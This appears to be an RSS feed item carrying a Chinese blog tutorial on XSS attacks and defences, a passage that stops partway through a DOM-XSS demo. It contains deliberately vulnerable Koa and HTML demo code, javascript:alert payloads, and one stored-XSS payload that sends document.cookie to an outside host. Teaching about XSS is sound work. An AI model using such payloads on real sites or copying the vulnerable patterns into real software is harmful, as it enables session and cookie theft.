<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>web安全之XSS攻击原理及防范 - 龙恩0707</title>
<link>http://www.cnblogs.com/tugenhua0707/p/10909284.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tugenhua0707/p/10909284.html</guid>
<description>&lt;p&gt;一：什么是XSS攻击？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击。&lt;/strong&gt;XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：&lt;br/&gt;恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。&lt;/p&gt;

&lt;p&gt;二：反射型XSS&lt;/p&gt;
&lt;p&gt;反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。&lt;/p&gt;
&lt;p&gt;反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。&lt;/p&gt;
&lt;p&gt;比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 &quot;反射&quot;到受害者的浏览器上，从而浏览器就执行了该脚本。&lt;/p&gt;
&lt;p&gt;因此反射型XSS的攻击步骤如下：&lt;/p&gt;
&lt;p&gt;1. 攻击者在url后面的参数中加入恶意攻击代码。&lt;br/&gt;2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。&lt;br/&gt;3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。&lt;br/&gt;4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户&lt;br/&gt;的行为，调用目标网站接口执行攻击等操作。&lt;/p&gt;
&lt;p&gt;常见的反射性XSS有哪些？&lt;/p&gt;
&lt;p&gt;常见的是：&lt;strong&gt;恶意链接。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如我现在做一个demo。在本地启动一个简单的服务器，然后在页面上点击一个链接后，比如如下代码：html代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;csrf攻击&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;http://localhost:3001/xss&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;xxs 攻击&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;http://localhost:3001/testcookie&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;testcookie 攻击&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后node中app.js 代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
const Koa = require('koa'&lt;span&gt;);
const fs &lt;/span&gt;= require('fs'&lt;span&gt;);
const path &lt;/span&gt;= require('path'&lt;span&gt;);
const router &lt;/span&gt;= require('koa-router'&lt;span&gt;)();
const koaBody &lt;/span&gt;= require('koa-body'&lt;span&gt;);
const static &lt;/span&gt;= require('koa-static'&lt;span&gt;);

const app &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Koa();

router.get(&lt;/span&gt;'/', (ctx, next) =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置头类型, 如果不设置，会直接下载该页面&lt;/span&gt;
  ctx.type = 'html'&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 读取文件&lt;/span&gt;
  const pathUrl = path.join(__dirname, '/static/index.html'&lt;span&gt;);
  ctx.body &lt;/span&gt;=&lt;span&gt; fs.createReadStream(pathUrl);
  next();
});

router.get(&lt;/span&gt;'/xss', (ctx, next) =&amp;gt;&lt;span&gt; {
  ctx.body &lt;/span&gt;= '&amp;lt;script&amp;gt;alert(&quot;反射型 XSS 攻击&quot;)&amp;lt;/script&amp;gt;'&lt;span&gt;;
});
router.get(&lt;/span&gt;'/testcookie', (ctx, next) =&amp;gt;&lt;span&gt; {
  console.log(ctx.cookies.get(&lt;/span&gt;'connect.sid'&lt;span&gt;));
  ctx.body &lt;/span&gt;= '&amp;lt;script&amp;gt;alert(&quot;'+ctx.cookies.get('connect.sid')+'&quot;)&amp;lt;/script&amp;gt;'&lt;span&gt;;
  next();
});

app.use(static(path.join(__dirname)));

app.use(router.routes());
app.use(router.allowedMethods());

app.listen(&lt;/span&gt;3001, () =&amp;gt;&lt;span&gt; {
  console.log(&lt;/span&gt;'server is listen in 3001'&lt;span&gt;);
});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如上代码，当用户点击xxs 攻击恶意链接时候，页面会跳转到 http://localhost:3001/xss 攻击者预先准备的页面，然后会返回攻击者准备的js脚本，该js脚本就在浏览器中执行了，如下所示：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231214099-1234219577.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当用户点击 testcookie 攻击 这个链接的时候，首先要保证页面上有cookie，比如我请求如下的cookie:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231229205-1557810526.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后我们点击 testcookie 该链接，也会调用node中的 router.get('/testcookie', (ctx, next) =&amp;gt; {}) 这个请求获取到cookie，如下所示：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231254328-364209115.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上我们就可以很容易通过xss攻击拿到对方的cookie信息了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/tugenhua0707/web-security/tree/master/xss/%E5%8F%8D%E5%B0%84%E6%80%A7xss&quot; target=&quot;_blank&quot;&gt;github源码查看&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;三：存储型XSS&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：&amp;lt;script&amp;gt;window.open(&quot;www.gongji.com?param=&quot;+document.cookie)&amp;lt;/script&amp;gt; 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此存储型XSS的攻击步骤如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. 攻击者将恶意代码提交到目标网站数据库中。&lt;br/&gt;2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。&lt;br/&gt;3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。&lt;br/&gt;4. 那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该&lt;br/&gt;cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如何防范？&lt;/strong&gt;&lt;br/&gt;1. 后端需要对提交的数据进行过滤。&lt;br/&gt;2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。&lt;/p&gt;

&lt;p&gt;四：DOM-based型XSS&lt;/p&gt;
&lt;p&gt;我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。因此DOM型XSS的攻击步骤如下：&lt;/p&gt;
&lt;p&gt;1. 攻击者构造出特殊的URL、在其中可能包含恶意代码。&lt;br/&gt;2. 用户打开带有恶意代码的URL。&lt;br/&gt;3. 用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。&lt;br/&gt;4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口&lt;br/&gt;执行攻击者一些操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：&lt;/strong&gt;&lt;br/&gt;1. 使用document.write直接输出数据。&lt;br/&gt;2. 使用innerHTML直接输出数据。&lt;br/&gt;3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。&lt;br/&gt;比如如下demo:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;script&amp;gt;&lt;span&gt;
  document.body.innerHTML &lt;/span&gt;= &quot;&amp;lt;a href='&quot;+url+&quot;'&amp;gt;&quot;+url+&quot;&amp;lt;/a&amp;gt;&quot;&lt;span&gt;;
&lt;/span&gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;假如对于变量url的值是：javascript:alert('dom-xss'); 类似这样的，那么就会收到xss的攻击了。因此对于DOM XSS主要是由于本地客户端获取的DOM数据在本地执行导致的。因此我们需要对HTML进行编码，对JS进行编码来防止这些问题产生。具体如何编码可以请看我下面的 XSS 如何防范那个地方即可。&lt;/p&gt;
&lt;p&gt;我们接下来看看demo代码吧：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 使用document.write直接输出导致浏览器解析恶意代码&lt;/strong&gt;&lt;br/&gt;代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; location.search;            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回URL中的查询部分（？之后的内容）&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为了方便演示，我们假如url是 如下这样的&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); &lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后我们的是 s 的值就为如下：&lt;/span&gt;
&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;?url=javascript:alert('xsstest')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;, s.length);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回整个查询内容&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;                       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义变量url&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;-&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断URL是否为空 &lt;/span&gt;
      &lt;span&gt;var&lt;/span&gt;&lt;span&gt; pos &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 过滤掉&quot;url=&quot;字符&lt;/span&gt;
&lt;span&gt;      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(pos, s.length);  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到地址栏里的url参数&lt;/span&gt;
&lt;span&gt;    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url参数为空&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }
    document.write(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;url: &amp;lt;a href=&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;); 
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;页面渲染完成后，点击弹窗如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/561794/201905/561794-20190522231742177-474046373.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 使用innerHTML直接输出导致浏览器解析恶意代码&lt;/strong&gt;&lt;br/&gt;代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=utf-8&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;referrer&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;never&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; location.search;            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回URL中的查询部分（？之后的内容）&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为了方便演示，我们假如url是 如下这样的&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); &lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 然后我们的是 s 的值就为如下：&lt;/span&gt;
&lt;span&gt;    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;?url=javascript:alert('xsstest')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    s &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;, s.length);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 返回整个查询内容&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;;                       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 定义变量url&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; &lt;span&gt;-&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断URL是否为空 &lt;/span&gt;
      &lt;span&gt;var&lt;/span&gt;&lt;span&gt; pos &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.indexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;4&lt;/span&gt;&lt;span&gt;;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 过滤掉&quot;url=&quot;字符&lt;/span&gt;
&lt;span&gt;      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; s.substring(pos, s.length);  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 得到地址栏里的url参数&lt;/span&gt;
&lt;span&gt;    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
      url &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url参数为空&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;='test'&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt;&lt;span&gt;href&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      document.getElementById(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).innerHTML &lt;/span&gt;&lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;我的url是: &amp;lt;a href=&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;+&lt;/span&gt;&lt;span&gt; url &lt;/span&gt;&lt;span&gt;+&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;点击一样也会弹窗窗口的。也会一样执行xss攻击的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 使用location/location.href/location.replace/iframe.src 造成的XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
